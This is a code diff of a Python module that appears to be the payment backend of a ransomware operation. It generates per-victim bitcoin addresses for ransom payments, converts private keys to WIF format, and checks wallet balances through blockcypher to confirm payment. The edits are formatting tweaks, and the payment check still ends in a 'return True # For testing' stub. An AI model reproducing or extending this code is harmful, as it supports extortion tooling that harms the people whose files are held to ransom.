@@ -1,12 +1,13 @@
+import hashlib
+import logging
+import blockcypher
 from asymmetric_encryption import ECC
 from db import (
     insert_bitcoin_details_to_database,
     get_bitcoin_wallet_id_database,
     insert_payment_details_into_database,
 )
-import hashlib
-import logging
-import blockcypher
+
 
 logger = logging.getLogger(__name__)
 
@@ -101,7 +102,7 @@ def encode_private_key_in_wif(private_key):
 
     Returns:
         str: The private key in WIF format
-    """    
+    """
     logger.info("Converting private key to WIF format")
     private_key_in_hex = private_key.hex()
     network_byte = "80"
@@ -121,7 +122,7 @@ def generate_bitcoin_address(client_id):
 
     Returns:
         str: Wallet id that the client will need to pay ransom to
-    """    
+    """
     logger.info(f"Generating bitcoin payment addresses for {client_id}")
     cipher = ECC()
     serialized_private_key = cipher.private_key
@@ -155,17 +156,15 @@ def verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
 
     Returns:
         boolean: Returns True if the payment has been made
-    """ 
+    """
     if not assigned_wallet_address == get_bitcoin_wallet_id_database(client_id):
-        logger.info("Given wallet address does not match with assigned wallet address")
+        logger.error("Given wallet address does not match with assigned wallet address")
         return None
 
     address_details = blockcypher.get_address_overview(assigned_wallet_address)
-    
+
     if address_details.get("balance") > 5328:
         insert_payment_details_into_database(client_id, payee_wallet_address)
         return True
-    return True #For testing
-    
-    
+    return True  # For testing
 
